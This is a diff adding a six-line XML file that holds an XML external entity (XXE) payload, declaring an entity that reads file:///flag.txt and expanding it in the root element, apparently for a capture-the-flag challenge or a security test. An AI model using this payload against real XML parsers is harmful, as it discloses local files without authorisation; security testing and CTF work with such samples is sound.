@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE root[
+        <!ELEMENT root (#PCDATA)>
+        <!ENTITY foo SYSTEM "file:///flag.txt">
+]>
+<root>&foo;</root>
